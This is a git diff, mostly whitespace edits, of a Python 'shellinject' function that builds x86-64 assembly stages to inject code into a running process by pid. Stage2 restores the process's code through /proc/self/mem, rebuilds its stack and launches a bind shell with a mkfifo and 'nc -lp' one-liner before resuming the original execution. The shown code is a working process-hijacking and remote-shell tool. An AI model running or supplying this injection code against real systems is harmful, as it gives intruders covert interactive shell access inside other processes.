@@ -121,6 +121,7 @@ def shellinject(pid, listen_port, stopmethod="sigstop"):
 		push r13
 		push r14
 		push r15
+
 		// Open stage2 file
 		mov rax, 2          # SYS_OPEN
 		lea rdi, path[rip]  # path
@@ -128,6 +129,7 @@ def shellinject(pid, listen_port, stopmethod="sigstop"):
 		xor rdx, rdx        # mode
 		syscall
 		mov r14, rax        # save the fd for later
+
 		// mmap it
 		mov rax, 9              # SYS_MMAP
 		xor rdi, rdi            # addr
@@ -138,16 +140,20 @@ def shellinject(pid, listen_port, stopmethod="sigstop"):
 		xor r9, r9              # off
 		syscall
 		mov r15, rax            # save mmap addr
+
 		// close the file
 		mov rax, 3    # SYS_CLOSE
 		mov rdi, r14  # fd
 		syscall
+
 		// delete the file (not exactly necessary)
 		mov rax, 87         # SYS_UNLINK
 		lea rdi, path[rip]  # path
 		syscall
+
 		// jump to stage2
 		jmp r15
+
 	path:
 		.ascii "{stage2_path}\0"
 	""")
@@ -170,7 +176,7 @@ def shellinject(pid, listen_port, stopmethod="sigstop"):
 	stage2 = assemble(fr"""
 		cld
 		fxsave moar_regs[rip]
-		
+
 		// Open /proc/self/mem
 		mov rax, 2                   # SYS_OPEN
 		lea rdi, proc_self_mem[rip]  # path
@@ -178,32 +184,32 @@ def shellinject(pid, listen_port, stopmethod="sigstop"):
 		xor rdx, rdx                 # mode
 		syscall
 		mov r15, rax  # save the fd for later
-		
+
 		// seek to code
 		mov rax, 8      # SYS_LSEEK
 		mov rdi, r15    # fd
 		mov rsi, {rip}  # offset
 		xor rdx, rdx    # whence (SEEK_SET)
 		syscall
-		
+
 		// restore code
 		mov rax, 1                   # SYS_WRITE
 		mov rdi, r15                 # fd
 		lea rsi, old_code[rip]       # buf
 		mov rdx, {len(code_backup)}  # count
 		syscall
-		
+
 		// close /proc/self/mem
 		mov rax, 3    # SYS_CLOSE
 		mov rdi, r15  # fd
 		syscall
-		
+
 		// move pushed regs to our new stack
 		lea rdi, new_stack_base[rip-{STACK_BACKUP_SIZE}]
 		mov rsi, {rsp-STACK_BACKUP_SIZE}
 		mov rcx, {STACK_BACKUP_SIZE}
 		rep movsb
-		
+
 		// restore original stack
 		mov rdi, {rsp-STACK_BACKUP_SIZE}
 		lea rsi, old_stack[rip]
@@ -229,14 +235,14 @@ def shellinject(pid, listen_port, stopmethod="sigstop"):
 		lea rax, argv[rip+16]
 		lea rbx, argv2[rip]
 		mov [rax], rbx
-		
+
 		// execve
 		mov rax, 59  # SYS_EXECVE
 		lea rdi, argv0[rip]  # pathname
 		lea rsi, argv[rip]   # argv
 		mov rdx, 0           # envp
 		syscall
-		
+
 		// exit (we should never get here)
 		mov rdi, -1
 		mov rax, 60
@@ -262,30 +268,41 @@ def shellinject(pid, listen_port, stopmethod="sigstop"):
 		popf
 		mov rsp, {rsp}
 		jmp old_rip[rip]
+
 	old_rip:
 		.quad {rip}
+
 	old_code:
 		.byte {",".join(map(str, code_backup))}
+
 	old_stack:
 		.byte {",".join(map(str, stack_backup))}
 		.align 16
+
 	moar_regs:
 		.space 512
+
 	proc_self_mem:
 		.ascii "/proc/self/mem\0"
+
 	argv0:
 		.ascii "/bin/sh\0"
+
 	argv1:
 		.ascii "-c\0"
+
 	argv2:
 		.ascii "rm -f /dev/shm/f; mkfifo /dev/shm/f; cat /dev/shm/f | /bin/sh -i 2>&1 | nc -lp {listen_port} > /dev/shm/f\0"
+
 	argv:
 		.quad argv0   # argv entries needs relocating at runtime
 		.quad argv1
 		.quad argv2
 		.quad 0
+
 	new_stack:
 		.balign 0x8000
+
 	new_stack_base:
 	""")
 
